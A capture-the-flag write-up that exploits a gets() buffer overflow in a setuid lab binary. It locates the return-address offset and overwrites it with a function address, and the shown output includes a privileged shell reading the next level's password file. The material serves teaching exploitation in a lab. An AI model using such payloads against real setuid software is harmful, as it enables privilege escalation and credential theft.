# level1

We have a `level1` binary, with again a setuid bit set for the user `level2`.

```bash
$ python -c 'print("A"*10000)' | ./level1
Segmentation fault (core dumped)
```

If we disassemble the binary, we have a `gets` call, which is vulnerable to buffer overflow.

```bash
$ objdump -d level1
 8048489:       8d 44 24 10             lea    0x10(%esp),%eax
 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
```

We need to know the size of the buffer to overflow it.

```asm
 push   %ebp
 mov    %esp,%ebp
 and    $0xfffffff0,%esp
 sub    $0x50,%esp ; here is the size of the buffer (0x50 or 80 bytes)
 lea    0x10(%esp),%eax ; here is the address of the buffer
 mov    %eax,(%esp)  
 call   8048340 <gets@plt>
```

Let's try to overflow the buffer with 80 bytes.

```bash
$ python -c 'print("A"*80)' | ./level1'
Segmentation fault (core dumped)
```

A cool trick to get the EIP address is to create a string with multiple blocks of 4 consecutive, identical bytes to fill the buffer. This way, we can see which block of 4 bytes overwrites the EIP.

```bash
$ python -c 'print("A"*72 + "B"*4 + "C"*4)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
$ gdb level1
(gdb) r
Starting program: /home/user/level1/level1 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
```

Here we can see that the EIP is overwritten by `0x43434343` (CCCC in ASCII). So, removing all the 'C' gives us a buffer overflow of 76 bytes, we can then inject the address of the `run` function at the end of our buffer.

Using `gdb` we can disassemble the `run` function and get its address. (0x08048444)

To generate our payload, we will use `python` again :

```bash
$ python -c 'print("A"*76 + "\x44\x84\x04\x08")' | ./level1 # little endianness
```

But when we run it, we get our `Good... Wait what?` message, and we segfault because our `STDIN` is closed.

We can dump our payload to a file, run `cat /tmp/a - | ./level1` and it works because we have a `STDIN` again. (the `-` will read from `STDIN`)

```bash
$ python -c 'print("A"*76 + "\x44\x84\x04\x08")' > /tmp/a
cat /tmp/a - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
Segmentation fault (core dumped)
```

(notice the `euid` being `level2` thanks to the setuid bit.)

